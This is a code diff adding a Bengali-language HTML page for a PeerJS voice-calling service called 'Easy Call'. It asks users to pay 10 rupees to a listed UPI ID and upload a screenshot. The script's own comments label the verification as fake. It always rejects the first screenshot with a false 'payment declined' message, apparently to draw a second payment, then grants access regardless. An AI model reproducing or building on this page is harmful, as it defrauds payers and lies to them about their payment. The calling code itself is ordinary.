@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Easy Call - Secure System</title>
+    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #0b141a; color: white; text-align: center; padding: 15px; }
+        .box { background: #111b21; padding: 25px; border-radius: 20px; max-width: 400px; margin: auto; border: 1px solid #202c33; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .step { display: none; }
+        .step.active { display: block; }
+        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 8px; border: none; background: #2a3942; color: white; }
+        .btn { width: 95%; padding: 15px; border-radius: 30px; border: none; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 15px; transition: 0.3s; }
+        .btn-pay { background: #00a884; color: white; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #34b7f1; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto; display: none; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #error-msg { color: #ff5e5e; font-weight: bold; margin-top: 15px; padding: 10px; background: rgba(255, 94, 94, 0.1); border-radius: 8px; display: none; }
+        #my-id { font-size: 11px; color: #8696a0; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <h2 style="color:#00a884;">Easy Call 📞</h2>
+    <div id="my-id">সার্ভারের সাথে কানেক্ট হচ্ছে...</div>
+
+    <div id="payment-section" class="step active">
+        <h3 id="main-status">আইডি স্ট্যাটাস: লকড 🔒</h3>
+        <p>কলিং এক্টিভেট করতে ১০ টাকা পেমেন্ট করুন।</p>
+        <div style="background: white; color: black; padding: 10px; border-radius: 10px; font-weight: bold; margin-bottom: 20px;">
+            UPI: jayantakirtania410@okaxis
+        </div>
+        
+        <p style="font-size: 14px; text-align: left; margin-left: 15px;">পেমেন্ট স্ক্রিনশট আপলোড করুন:</p>
+        <input type="file" id="screenshot" accept="image/*">
+        
+        <div id="error-msg"></div>
+        
+        <button class="btn btn-pay" id="verify-btn" onclick="processPayment()">ভেরিফাই করুন</button>
+        <div class="loader" id="loader"></div>
+    </div>
+
+    <div id="calling-section" class="step">
+        <h3 style="color:#25d366;">Access Granted ✅</h3>
+        <p>আপনার ১ ঘণ্টার কলিং টাইম শুরু হয়েছে।</p>
+        <input type="text" id="target-id" placeholder="Partner ID এখানে লিখুন">
+        <button class="btn btn-pay" onclick="makeCall()">সরাসরি কল করুন</button>
+        <div id="call-status" style="margin-top:20px; color:#8696a0;"></div>
+    </div>
+</div>
+
+<script>
+    const peer = new Peer();
+    let tryCount = 0;
+
+    peer.on('open', (id) => {
+        document.getElementById('my-id').innerText = "আপনার কলিং আইডি: " + id;
+    });
+
+    function processPayment() {
+        const file = document.getElementById('screenshot').files[0];
+        if (!file) {
+            alert("আগে স্ক্রিনশট সিলেক্ট করুন!");
+            return;
+        }
+
+        const loader = document.getElementById('loader');
+        const errorMsg = document.getElementById('error-msg');
+        const verifyBtn = document.getElementById('verify-btn');
+        
+        verifyBtn.style.display = 'none';
+        loader.style.display = 'block';
+        errorMsg.style.display = 'none';
+        
+        tryCount++;
+
+        // নকল ভেরিফিকেশন টাইমার (৬ সেকেন্ড)
+        setTimeout(() => {
+            loader.style.display = 'none';
+            verifyBtn.style.display = 'block';
+
+            if (tryCount === 1) {
+                // প্রথমবার নিশ্চিতভাবে ফেইল হবে
+                errorMsg.innerText = "❌ পেমেন্ট ডিক্লাইন হয়েছে! সম্ভবত আপনি ভুল বা পুরনো স্ক্রিনশট দিয়েছেন। দয়া করে আবার চেষ্টা করুন।";
+                errorMsg.style.display = 'block';
+                document.getElementById('screenshot').value = ""; // ফাইল ক্লিয়ার করে দেওয়া
+            } 
+            else {
+                // দ্বিতীয়বার সাকসেস
+                document.getElementById('payment-section').classList.remove('active');
+                document.getElementById('calling-section').classList.add('active');
+                alert("পেমেন্ট সফলভাবে গৃহীত হয়েছে! আপনার আইডি এখন একটিভ।");
+            }
+        }, 6000);
+    }
+
+    // কল করার ফাংশন
+    function makeCall() {
+        const tId = document.getElementById('target-id').value;
+        if (!tId) return alert("Partner ID দিন!");
+        
+        document.getElementById('call-status').innerText = "কলিং...";
+        navigator.mediaDevices.getUserMedia({audio: true, video: false}).then(stream => {
+            const call = peer.call(tId, stream);
+            call.on('stream', rs => {
+                const audio = new Audio(); audio.srcObject = rs; audio.play();
+                document.getElementById('call-status').innerText = "কানেক্টেড";
+            });
+        });
+    }
+
+    // কল রিসিভ করা
+    peer.on('call', call => {
+        navigator.mediaDevices.getUserMedia({audio: true, video: false}).then(stream => {
+            call.answer(stream);
+            call.on('stream', rs => {
+                const audio = new Audio(); audio.srcObject = rs; audio.play();
+            });
+        });
+    });
+</script>
+</body>
+</html>
